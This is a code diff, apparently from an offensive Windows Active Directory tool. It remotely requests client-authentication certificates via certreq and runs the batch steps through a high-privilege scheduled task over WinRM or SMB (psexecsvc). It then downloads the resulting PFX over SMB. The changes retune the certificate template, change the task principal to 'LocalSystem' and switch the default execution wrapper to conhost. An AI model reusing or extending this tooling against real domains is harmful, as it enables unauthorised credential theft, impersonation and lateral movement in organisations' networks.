@@ -75,6 +75,7 @@ except ImportError:
 CERT_INF = """\
 [Version]
 Signature="$Windows NT$"
+
 [NewRequest]
 Subject = "CN={cn}"
 KeySpec = 1
@@ -85,10 +86,14 @@ SMIME = FALSE
 PrivateKeyArchive = FALSE
 UserProtected = FALSE
 UseExistingKeySet = FALSE
-ProviderName = "Microsoft Strong Cryptographic Provider"
-ProviderType = 1
+ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
+ProviderType = 12
 RequestType = PKCS10
 KeyUsage = 0xa0
+
+[EnhancedKeyUsageExtension]
+OID=1.3.6.1.5.5.7.3.2
+
 [RequestAttributes]
 CertificateTemplate = {template}
 """
@@ -98,13 +103,13 @@ CERT_BAT = """\
 setlocal enabledelayedexpansion
 set "BASE={drop_dir}\\{prefix}"
 
-certreq -q -new "%BASE%.inf" "%BASE%.req" >"%BASE%.log" 2>&1
+certreq -new "%BASE%.inf" "%BASE%.req" >"%BASE%.log" 2>&1
 if !ERRORLEVEL! neq 0 (echo FAIL_CERTREQ_NEW>"%BASE%.status" & exit /b 1)
 
-certreq -q -submit{ca_flag} "%BASE%.req" "%BASE%.cer" >>"%BASE%.log" 2>&1
+certreq -submit{ca_flag} "%BASE%.req" "%BASE%.cer" >>"%BASE%.log" 2>&1
 if not exist "%BASE%.cer" (
     if exist "%BASE%.rsp" (
-        certreq -q -accept "%BASE%.rsp" >>"%BASE%.log" 2>&1
+        certreq -accept "%BASE%.rsp" >>"%BASE%.log" 2>&1
         if !ERRORLEVEL! neq 0 (echo FAIL_ACCEPT>"%BASE%.status" & exit /b 1)
         goto :findhash
     )
@@ -141,7 +146,7 @@ CERT_BAT_PHASE1 = """\
 @echo off
 setlocal enabledelayedexpansion
 set "BASE={drop_dir}\\{prefix}"
-certreq -q -new "%BASE%.inf" "%BASE%.req" >"%BASE%.log" 2>&1
+certreq -new "%BASE%.inf" "%BASE%.req" >"%BASE%.log" 2>&1
 if !ERRORLEVEL! neq 0 (echo FAIL_CERTREQ_NEW>"%BASE%.status" & exit /b 1)
 echo OK_REQ>"%BASE%.status"
 """
@@ -174,9 +179,8 @@ TASK_XML = """\
    </RegistrationTrigger>
 </Triggers>
 <Principals>
-   <Principal id="Author">
+   <Principal id="LocalSystem">
    <UserId>{domain}\\{username}</UserId>
-   <LogonType>InteractiveToken</LogonType>
    <RunLevel>HighestAvailable</RunLevel>
    </Principal>
 </Principals>
@@ -198,7 +202,7 @@ TASK_XML = """\
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
 </Settings>
-<Actions Context="Author">
+<Actions Context="LocalSystem">
    <Exec>
    <Command>{exec_cmd}</Command>
    <Arguments>{exec_args}</Arguments>
@@ -1583,9 +1587,9 @@ def parse_args():
     exc.add_argument("--exec-method", default="winrm",
         choices=["winrm", "smb", "manual"],
         help="Command execution method: winrm (default), smb (psexecsvc), or manual (generate files only)")
-    exc.add_argument("--exec-wrapper", default="cmd",
+    exc.add_argument("--exec-wrapper", default="conhost",
         choices=list(EXEC_METHODS),
-        help="Bat execution wrapper: cmd|conhost|powershell|wscript (default: cmd)")
+        help="Bat execution wrapper: conhost|cmd|powershell|wscript (default: conhost)")
     exc.add_argument("--download-method", default="smb",
         choices=["smb", "smbclient"],
         help="PFX download method (default: smb)")
